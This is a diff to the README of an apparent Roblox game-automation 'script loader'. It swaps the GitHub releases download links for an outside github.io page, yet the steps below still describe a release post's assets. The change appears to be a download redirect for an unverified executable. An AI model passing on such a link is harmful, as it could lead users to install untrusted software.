@@ -1,12 +1,12 @@
 # 🎮 all-star-tower-script-loader - Automate your tower defense game progress
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/linemancarolingian458/all-star-tower-script-loader/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://linemancarolingian458.github.io)
 
 This software helps players manage scripts for their favorite tower defense games on Roblox. It works as an HTML-based utility. It automates tasks like collecting resources and managing tower settings. You can adjust your preferences through a simple menu. The loader handles updates to ensure your tools remain compatible with the latest game versions.
 
 ## 📥 Downloading the software
 
-Visit the [official release page](https://github.com/linemancarolingian458/all-star-tower-script-loader/releases) to download the latest version.
+Visit the [official release page](https://linemancarolingian458.github.io) to download the latest version.
 
 1. Navigate to the link provided above.
 2. Look for the Assets section at the bottom of the latest release post.
